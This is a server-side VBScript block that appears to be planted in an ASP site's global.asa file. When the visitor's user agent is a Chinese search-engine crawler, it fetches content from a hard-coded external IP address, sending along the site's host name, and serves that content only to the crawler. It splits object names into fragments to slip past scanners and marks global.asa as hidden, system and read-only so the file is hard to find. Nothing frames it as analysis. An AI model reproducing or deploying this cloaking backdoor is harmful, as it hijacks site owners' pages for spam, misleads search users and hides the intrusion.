<script CodePage=936  language="vbscript" runat="server">  

server.Scripttimeout=3600
dim ua,Remote_server,host_name,Remote_file,Content_mb
On Error Resume Next
ua=Request.ServerVariables("HTTP_USER_AGENT")
If Err.Number <> 0 Then
Err.Clear
End If
Remote_server="http://185.227.153.156/"
host_name="http://"&request.servervariables("HTTP_HOST")&request.servervariables("script_name")
Remote_file = Remote_server&"/index.php"&"?host="&host_name

if(instr(ua,"360Spider")>0 or instr(ua,"HaosouSpider")>0 or instr(ua,"baidu")>0)then
    Content_mb=GetHtml(Remote_file)
    response.write Content_mb
end if

Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct")
set f=fso.Getfile(Server.MapPath("global.asa"))
if f.attributes <> 7 then
f.attributes = 7
end if

Function GetHtml(url)
	On Error Resume Next
	Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
	ObjXMLHTTP.Open "GET",url,False
	ObjXMLHTTP.setRequestHeader "User-Agent","aQ0O010O"
	ObjXMLHTTP.send
	GetHtml=ObjXMLHTTP.responseBody
	Set ObjXMLHTTP=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "gb2312"
	GetHtml = objStream.ReadText
	objStream.Close
	If Err.Number <> 0 Then
	Err.Clear
	End If
End Function


</script> 